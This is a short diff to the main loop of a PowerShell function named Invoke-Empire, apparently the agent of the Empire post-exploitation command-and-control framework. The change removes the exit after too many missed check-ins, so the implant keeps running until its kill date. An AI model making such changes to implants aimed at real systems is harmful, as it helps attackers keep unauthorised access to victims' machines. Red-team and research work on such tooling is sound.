@@ -1092,7 +1092,7 @@ function Invoke-Empire {
     while ($True) {
 
         # check the kill date and lost limit, exiting and returning job output if either are past
-        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {
+        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) ) {
 
             $Packets = $null
 
